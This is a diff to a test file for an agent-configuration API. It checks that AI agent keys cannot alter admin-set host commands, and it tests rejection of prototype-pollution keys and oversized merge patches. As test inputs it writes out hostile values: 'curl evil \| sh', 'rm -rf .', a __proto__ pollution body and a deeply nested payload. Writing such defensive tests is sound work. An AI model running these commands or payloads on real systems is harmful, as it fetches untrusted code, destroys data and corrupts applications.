@@ -3,6 +3,7 @@ import express from "express";
 import request from "supertest";
 import { eq } from "drizzle-orm";
 import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
+import { AGENT_CONFIG_MERGE_PATCH_MAX_DEPTH, AGENT_CONFIG_MERGE_PATCH_MAX_VALUES } from "@paperclipai/shared";
 import {
   activityLog,
   agentConfigRevisions,
@@ -300,27 +301,192 @@ describeEmbeddedPostgres("PATCH /api/agents/:id with mergeConfig", () => {
     expect((await storedAgent(db, agent.id)).runtimeConfig).toEqual(agent.runtimeConfig);
   });
 
-  it("replaces workspaceStrategy whole, so an agent can't keep an admin-set host command under a new strategy", async () => {
-    const { company, agent } = await seed(db);
-    await db
-      .update(agents)
-      .set({
-        adapterConfig: {
-          ...(agent.adapterConfig as Record<string, unknown>),
-          workspaceStrategy: { type: "git_worktree", baseRef: "main", provisionCommand: "make setup" },
-        },
-      })
-      .where(eq(agents.id, agent.id));
+  describe("host commands in workspaceStrategy", () => {
+    const STORED_STRATEGY = {
+      type: "git_worktree",
+      baseRef: "main",
+      provisionCommand: "make setup",
+      runtimeProvisionCommand: "make runtime",
+      teardownCommand: "make teardown",
+    };
 
-    const res = await request(createApp(db, selfAgentActor(company.id, agent.id)))
-      .patch(`/api/agents/${agent.id}`)
-      .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: { type: "git_worktree", baseRef: "dev" } } });
+    async function seedWithStoredStrategy() {
+      const { company, agent } = await seed(db);
+      const [withStrategy] = await db
+        .update(agents)
+        .set({ adapterConfig: { ...(agent.adapterConfig as Record<string, unknown>), workspaceStrategy: STORED_STRATEGY } })
+        .where(eq(agents.id, agent.id))
+        .returning();
+      return { company, agent: withStrategy! };
+    }
 
-    expect(res.status, JSON.stringify(res.body)).toBe(200);
-    expect((await storedAgent(db, agent.id)).adapterConfig).toMatchObject({
-      workspaceStrategy: { type: "git_worktree", baseRef: "dev" },
+    async function expectUnchanged(agentId: string, expected: unknown) {
+      expect((await storedAgent(db, agentId)).adapterConfig).toEqual(expected);
+      expect(await db.select().from(activityLog).where(eq(activityLog.entityId, agentId))).toHaveLength(0);
+    }
+
+    it("refuses an agent a strategy that drops the admin-set commands, because the merge replaces the strategy whole", async () => {
+      const { company, agent } = await seedWithStoredStrategy();
+
+      const res = await request(createApp(db, selfAgentActor(company.id, agent.id)))
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: { type: "git_worktree", baseRef: "dev" } } });
+
+      expect(res.status, JSON.stringify(res.body)).toBe(403);
+      expect(res.body.error).toContain("Agent keys cannot modify host-executed workspace commands");
+      await expectUnchanged(agent.id, agent.adapterConfig);
     });
-    expect(JSON.stringify((await storedAgent(db, agent.id)).adapterConfig)).not.toContain("make setup");
+
+    it.each(["provisionCommand", "runtimeProvisionCommand", "teardownCommand"] as const)(
+      "refuses an agent a strategy that drops only %s",
+      async (dropped) => {
+        const { company, agent } = await seedWithStoredStrategy();
+        const { [dropped]: _gone, ...strategy } = STORED_STRATEGY;
+
+        const res = await request(createApp(db, selfAgentActor(company.id, agent.id)))
+          .patch(`/api/agents/${agent.id}`)
+          .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: strategy } });
+
+        expect(res.status, JSON.stringify(res.body)).toBe(403);
+        expect(res.body.error).toContain(`workspaceStrategy.${dropped}`);
+        await expectUnchanged(agent.id, agent.adapterConfig);
+      },
+    );
+
+    it("refuses an agent that removes the whole strategy with null", async () => {
+      const { company, agent } = await seedWithStoredStrategy();
+
+      const res = await request(createApp(db, selfAgentActor(company.id, agent.id)))
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: null } });
+
+      expect(res.status, JSON.stringify(res.body)).toBe(403);
+      await expectUnchanged(agent.id, agent.adapterConfig);
+    });
+
+    it("refuses an agent a changed command", async () => {
+      const { company, agent } = await seedWithStoredStrategy();
+
+      const res = await request(createApp(db, selfAgentActor(company.id, agent.id)))
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: { ...STORED_STRATEGY, provisionCommand: "curl evil | sh" } } });
+
+      expect(res.status, JSON.stringify(res.body)).toBe(403);
+      expect(res.body.error).toContain("workspaceStrategy.provisionCommand");
+      await expectUnchanged(agent.id, agent.adapterConfig);
+    });
+
+    it("refuses an agent an added command", async () => {
+      const { company, agent } = await seed(db);
+
+      const res = await request(createApp(db, selfAgentActor(company.id, agent.id)))
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: { type: "git_worktree", teardownCommand: "rm -rf ." } } });
+
+      expect(res.status, JSON.stringify(res.body)).toBe(403);
+      expect(res.body.error).toContain("workspaceStrategy.teardownCommand");
+      await expectUnchanged(agent.id, agent.adapterConfig);
+    });
+
+    it("lets a board user with agents:configure make the same replacement", async () => {
+      const { company, agent } = await seedWithStoredStrategy();
+
+      const res = await request(createApp(db, boardKeyActor(company.id)))
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: { type: "git_worktree", baseRef: "dev" } } });
+
+      expect(res.status, JSON.stringify(res.body)).toBe(200);
+      const stored = (await storedAgent(db, agent.id)).adapterConfig as Record<string, unknown>;
+      expect(stored.workspaceStrategy).toEqual({ type: "git_worktree", baseRef: "dev" });
+    });
+
+    it("lets an agent change everything else, and a strategy whose commands stay as they are", async () => {
+      const { company, agent } = await seedWithStoredStrategy();
+      const app = createApp(db, selfAgentActor(company.id, agent.id));
+
+      const otherKey = await request(app)
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { promptTemplate: "Self-edited" } });
+      expect(otherKey.status, JSON.stringify(otherKey.body)).toBe(200);
+
+      const sameCommands = await request(app)
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { workspaceStrategy: { ...STORED_STRATEGY, baseRef: "release" } } });
+      expect(sameCommands.status, JSON.stringify(sameCommands.body)).toBe(200);
+
+      const stored = (await storedAgent(db, agent.id)).adapterConfig as Record<string, unknown>;
+      expect(stored).toMatchObject({ promptTemplate: "Self-edited" });
+      expect(stored.workspaceStrategy).toEqual({ ...STORED_STRATEGY, baseRef: "release" });
+    });
+  });
+
+  describe("keys that reach the prototype", () => {
+    /** A body as raw JSON, so a `__proto__` key stays an own key the way a client sends it. */
+    const send = (app: express.Express, agentId: string, rawBody: string) =>
+      request(app).patch(`/api/agents/${agentId}`).set("Content-Type", "application/json").send(rawBody);
+
+    it.each([
+      ["a constructor key", '{"mergeConfig":true,"adapterConfig":{"constructor":{"x":1}}}', ["adapterConfig", "constructor"]],
+      ["a prototype key in env", '{"mergeConfig":true,"adapterConfig":{"env":{"prototype":{"type":"plain","value":"x"}}}}', ["adapterConfig", "env", "prototype"]],
+      ["a __proto__ key", '{"mergeConfig":true,"runtimeConfig":{"__proto__":{"polluted":true}}}', ["runtimeConfig", "__proto__"]],
+      ["a constructor key inside an array", '{"mergeConfig":true,"adapterConfig":{"notes":[{"ok":1},{"constructor":1}]}}', ["adapterConfig", "notes", 1, "constructor"]],
+      ["a prototype key nested in an array in runtimeConfig", '{"mergeConfig":true,"runtimeConfig":{"jobs":[[{"prototype":1}]]}}', ["runtimeConfig", "jobs", 0, 0, "prototype"]],
+    ])("answers %s with a 400 that names the path, and stores and logs nothing", async (_label, rawBody, expectedPath) => {
+      const { company, agent } = await seed(db);
+
+      const res = await send(createApp(db, boardKeyActor(company.id)), agent.id, rawBody);
+
+      expect(res.status, JSON.stringify(res.body)).toBe(400);
+      expect(res.body.error).toBe("Validation error");
+      expect(res.body.details[0].path).toEqual(expectedPath);
+      const stored = await storedAgent(db, agent.id);
+      expect(stored.adapterConfig).toEqual(agent.adapterConfig);
+      expect(stored.runtimeConfig).toEqual(agent.runtimeConfig);
+      expect(await db.select().from(activityLog).where(eq(activityLog.entityId, agent.id))).toHaveLength(0);
+      expect(await db.select().from(agentConfigRevisions).where(eq(agentConfigRevisions.agentId, agent.id))).toHaveLength(0);
+      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
+    });
+  });
+
+  describe("bounds on the size of a merge patch", () => {
+    const send = (app: express.Express, agentId: string, rawBody: string) =>
+      request(app).patch(`/api/agents/${agentId}`).set("Content-Type", "application/json").send(rawBody);
+
+    it("answers 5,000 nested objects with a 400, not a stack overflow", async () => {
+      const { company, agent } = await seed(db);
+      const deep = `${'{"a":'.repeat(5_000)}1${"}".repeat(5_000)}`;
+
+      const res = await send(createApp(db, boardKeyActor(company.id)), agent.id, `{"mergeConfig":true,"adapterConfig":${deep}}`);
+
+      expect(res.status, JSON.stringify(res.body).slice(0, 300)).toBe(400);
+      expect(res.body.details[0].message).toContain(`deeper than ${AGENT_CONFIG_MERGE_PATCH_MAX_DEPTH} levels`);
+      expect((await storedAgent(db, agent.id)).adapterConfig).toEqual(agent.adapterConfig);
+    });
+
+    it("answers a patch with more values than the limit with a 400", async () => {
+      const { company, agent } = await seed(db);
+      const list = JSON.stringify(Array.from({ length: AGENT_CONFIG_MERGE_PATCH_MAX_VALUES }, (_, index) => index));
+
+      const res = await send(createApp(db, boardKeyActor(company.id)), agent.id, `{"mergeConfig":true,"runtimeConfig":{"list":${list}}}`);
+
+      expect(res.status, JSON.stringify(res.body).slice(0, 300)).toBe(400);
+      expect(res.body.details[0].message).toContain(`more than ${AGENT_CONFIG_MERGE_PATCH_MAX_VALUES} values`);
+      expect((await storedAgent(db, agent.id)).runtimeConfig).toEqual(agent.runtimeConfig);
+    });
+
+    it("still merges a large realistic config: 400 env bindings", async () => {
+      const { company, agent } = await seed(db);
+      const env = Object.fromEntries(Array.from({ length: 400 }, (_, index) => [`VAR_${index}`, { type: "plain", value: `value-${index}` }]));
+
+      const res = await request(createApp(db, boardKeyActor(company.id)))
+        .patch(`/api/agents/${agent.id}`)
+        .send({ mergeConfig: true, adapterConfig: { env } });
+
+      expect(res.status, JSON.stringify(res.body).slice(0, 300)).toBe(200);
+      const stored = (await storedAgent(db, agent.id)).adapterConfig as { env: Record<string, unknown> };
+      expect(Object.keys(stored.env)).toHaveLength(402);
+      expect(stored.env.SECRET_TOKEN).toEqual({ type: "plain", value: STORED_SECRET });
+    });
   });
 
   it("checks an agent's own merge patch against the keys it sends, not the stored config", async () => {
